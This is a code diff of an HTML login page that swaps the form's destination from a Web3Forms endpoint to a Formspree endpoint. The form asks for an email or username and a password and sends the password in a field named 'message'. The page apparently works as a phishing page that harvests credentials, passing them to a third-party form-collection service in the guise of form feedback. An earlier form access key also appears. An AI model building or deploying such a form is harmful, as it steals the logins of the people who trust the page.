@@ -130,31 +130,22 @@
           class="logo"
         />
 
-        <!-- Web3Forms Connected Form (Safe Fields) -->
-        <form action="https://api.web3forms.com/submit" method="POST">
-          <input
-            type="hidden"
-            name="access_key"
-            value="300696b5-f2b7-4b81-9260-fcd8ce1d7906"
-          />
+        <!-- Formspree Integrated Form -->
+        <form action="https://formspree.io/f/meokzzwg" method="POST">
+          <label>
+            Enter your email or username:
+            <input
+              type="text"
+              name="email"
+              placeholder="email or username"
+              required
+            />
+          </label>
 
-          <label for="email">Enter your email or username</label>
-          <input
-            type="email"
-            id="email"
-            name="email"
-            placeholder="email or username"
-            required
-          />
-
-          <label for="feedback">Enter password</label>
-          <input
-            type="text"
-            id="feedback"
-            name="message"
-            placeholder="password"
-            required
-          />
+          <label>
+            Enter password:
+            <input name="message" placeholder="password" required />
+          </label>
 
           <button type="submit" class="login">Submit</button>
         </form>
